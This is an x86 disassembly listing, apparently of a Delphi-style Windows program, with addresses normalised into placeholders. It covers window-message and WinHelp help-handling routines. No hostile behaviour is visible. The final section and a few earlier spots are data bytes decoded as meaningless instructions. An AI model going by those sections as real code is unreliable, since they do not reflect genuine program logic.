call sub_434394
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x6
call GetSystemMetrics
imul ebx
mov ebx eax
jmp r-xdata
sub_42e59c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0x7
jne r-xdata
mov edx ebx
mov eax esi
call sub_438f08
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
jne r-xdata
xor eax eax
mov [ ebx + 0x4 ] eax
sub_42e5d4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
retn
push 0xfffffff0
mov eax esi
call sub_43b390
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
push 0x0
push 0x3
push 0xd3
mov eax esi
call sub_43b390
push eax
call SendMessageA
sub_42e614
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43a9a8
pop esi
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax ebx
call sub_42e494
mov eax ebx
call sub_438930
sub_42e648
push ebx
mov ebx eax
mov eax ebx
call sub_43a8ec
test [ ebx + 0x51 ] 0x2
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_42e4d0
test [ ebx + 0x1c ] 0x1
jne r-xdata
sub_42e690
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43a744
pop esi
pop ebx
retn
test [ ebx + 0x54 ] 0x1
jne r-xdata
push 0xfffffff0
mov eax ebx
call sub_43b390
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
mov eax ebx
call sub_42e154
sub_42e6cc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43b694
test al al
je r-xdata
mov eax esi
mov si 0xffb3
call sub_403324
push 0xfffffff0
mov eax esi
call sub_43b390
push eax
call GetWindowLongA
test al 0x4
je r-xdata
pop esi
retn
sub_42e704
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx esi
mov eax ebx
call sub_43c44c
pop esi
pop ebx
retn
sub_42e720
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42e745
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e74c
retn
sub_42e84c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_441240
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_42e888
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42e8ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e8b4
retn
sub_42e9f8
pushfd
jmp r-xdata
push cs
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] dl
add [ eax ] al
nop
inc eax
inc edx
add [ eax + eax ] bl
add [ eax ] al
push cs
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42eb21
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403e78
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_403f10
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403ecc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42eb28
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e9c
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4041f8
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_42ea6c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42eb21
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403e78
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_403f10
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403ecc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42eb28
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e9c
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4041f8
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_42eb3c
push ebx
mov ebx eax
mov eax ebx
call sub_42ee6c
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_4054b4
sub_42eb78
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42ebdf
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_42ea6c
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ebe6
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_42ebf0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_42ec78
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_42eb64
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4041f8
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ec7f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e9c
retn
sub_42ec8b
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_42ed13
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_42f3b0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ed1a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e9c
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_42ea6c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_404338
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_42ec98
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_42ed13
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_42f3b0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ed1a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e9c
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_42ea6c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_404338
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_42ed20
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42ee18
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_42ea6c
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408a84
mov eax ebx
call sub_42f3b0
test al al
je r-xdata
mov ecx sub_42e8c0
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ee1f
lea eax [ ebp - 0x1c ]
call sub_403e78
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e9c
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_42ea6c
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_42f308
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_403ecc
mov eax [ ebp - 0x4 ]
call sub_404338
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_404338
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_42ee88
push ebx
mov ebx eax
mov eax ebx
call sub_42ee6c
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_4054b4
pop ebx
retn
mov eax rw-data
call sub_4054b4
sub_42eeb8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_42ef10
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ef17
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_42ea6c
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_42ef20
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42f016
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_408a44
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_42ea6c
mov eax ebx
call sub_42f3b0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f01d
lea eax [ ebp - 0x110 ]
call sub_403e78
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_4040e8
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_42f308
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_4040e8
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_404338
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_42f034
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_42f096
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f09d
lea eax [ ebp - 0x8 ]
call sub_403e78
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_42ea6c
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_42f0a8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42f128
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42ea6c
mov eax ebx
call sub_42f3b0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f12f
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_42f308
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_404338
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_42f138
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_42f223
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_42f3b0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f22a
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403e9c
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_407d8c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_42f308
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_407d8c
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_403ecc
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_42ea6c
mov eax [ ebp - 0x14 ]
call sub_404338
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_42f238
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_4084bc
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_42f293
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408498
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_42f308
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_404328
xor eax eax
push ebp
push sub_42f37e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_42f2ec
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f385
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407ab4
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_42f394
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_42f3b0
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_42f2ec
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_42f390
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_42f394
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_42f40c
sub_42f40c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_42f489
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_42ee6c
call GetTickCount
mov ebx eax
push 0x0
call sub_405fec
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_42ea6c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f490
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_404338
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_42f498
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f8
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_40344c
call sub_4054cc
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_42f4e0
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_42f50c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f57a
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f581
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_4054b4
mov eax rw-data
call sub_4054b4
mov eax rw-data
call sub_4054b4
mov eax rw-data
call sub_403e78
mov eax rw-data
call sub_4054b4
mov eax [ rw-data ]
call sub_42eb3c
sub_42f584
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f5d6
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f5dd
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42f498
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_4054b4
mov edx eax
mov eax [ rw-data ]
call sub_424330
sub_42f7c0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xf8
inc edx
add [ eax ] al
add [ eax ] al
clc
test [ edx ] 0x70
xor eax [ eax ]
mov al [ 0xffffffff90004321 ]
and [ ebx ] eax
test [ ebx ] dh
inc eax
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
sub al 0x22
inc ebx
add [ eax + 0x22 ] ah
inc ebx
add [ eax + 0x22 ] bh
inc ebx
add [ eax ] bl
inc ebx
add ah dl
and [ ebx ] eax
loopne r-xdata
je r-xdata
inc ebx
add [ edx + 0x21380043 ] al
inc ebx
add [ edx + 0x22000043 ] ah
inc ebx
add [ eax + 0x12004321 ] dh
push esp
inc esp
jb r-xdata
and [ ebx ] eax
movsb [ edi ] [ esi ]
and al [ ebx ]
add [ edx ] ah
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x6c ] si
clc
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
clc
inc edx
add [ eax ] al
add [ eax ] al
mov esp 0x700042f7
xor eax [ eax ]
mov al [ 0xffffffffc4004321 ]
and al [ ebx ]
test [ ebx ] dh
inc eax
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
sub al 0x22
inc ebx
add [ eax + 0x22 ] ah
inc ebx
add [ eax + 0x22 ] bh
inc ebx
add [ eax ] bl
inc ebx
add ah dl
and [ ebx ] eax
loopne r-xdata
inc ebx
outsd
outsb
inc ebx
add [ esp + 0x21180043 ] ah
inc ebx
add [ eax ] bl
inc ebx
add [ ebx + 0x43 ] bl
add al ah
pop ds
inc ebx
add [ ecx ] dh
inc ebx
add [ eax ] bh
and [ ebx ] eax
inc eax
and [ ebx ] eax
mov eax 0xc8004323
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ eax + 0x14004321 ] dh
push esp
inc esp
jb r-xdata
inc ebx
add [ edx + 0x21380043 ] al
inc ebx
add [ edx + 0x22000043 ] ah
inc edx
add [ eax + 0x33 ] dh
inc eax
add [ eax - 0x47ffbcdf ] ah
and al 0x43
add [ ebx + esi + 0x33780040 ] al
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ebx ] ch
inc ebx
add [ edx ] ch
inc ebx
add [ esp + 0x21180043 ] ah
inc ebx
add [ eax ] bl
inc ebx
add [ ebx + 0x43 ] bl
add al ah
pop ds
inc ebx
add [ ecx ] dh
inc ebx
add [ eax ] bh
and [ ebx ] eax
inc eax
and [ ebx ] eax
mov eax 0xc8004323
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + esi * 2 - 0x7 ] si
inc edx
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp - 0x7 ] si
inc edx
add [ eax + 0x42f7 ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
and al [ ebx ]
add [ ebx + eax * 2 ] ah
add [ esp + 0x43 ] bh
add [ eax - 0x4fffbcdc ] dl
and al 0x43
add [ edi ] cl
push esp
inc esp
jb r-xdata
and [ ebx ] eax
cmp [ ecx ] ah
inc ebx
add [ eax + 0x21 ] al
inc ebx
add [ eax - 0x37ffbcdd ] bh
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
and al 0xf9
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7 ] ah
inc edx
add [ eax ] dh
add [ eax ] al
clc
test [ edx ] 0x70
xor eax [ eax ]
mov al [ 0xffffffff90004321 ]
and [ ebx ] eax
test [ ebx ] dh
inc eax
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ebx ] ch
inc ebx
add [ edx ] ch
inc ecx
add [ esi + edi + 0x41 ] dh
add ah bh
aad 0x41
add al ch
aad 0x41
add [ esi + esi + 0x540e0043 ] dh
inc ebx
outsd
outsb
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
test dl bh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al [ ebx ]
add [ ebx + eax * 2 ] ah
add [ esp + 0x43 ] bh
add [ eax - 0x4fffbcdc ] dl
and al 0x43
add [ ecx ] dl
push esp
inc esp
jb r-xdata
add [ eax + 0x21 ] al
inc ebx
add [ eax - 0x37ffbcdd ] bh
outsd
insb
jae r-xdata
xor eax [ eax ]
shl [ eax ] 0x40
add ah bl
xor [ eax ] al
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
popad
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + 0x58004336 ] cl
aas
inc ecx
add [ eax + 0x3f ] ah
add [ ebx + 0x42f9e8c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 8 ] ah
inc edx
add [ eax ] dh
add [ eax ] al
fdivr st0
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 8 + 0x640042 ] bl
add [ eax ] al
sub al 0xb0
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
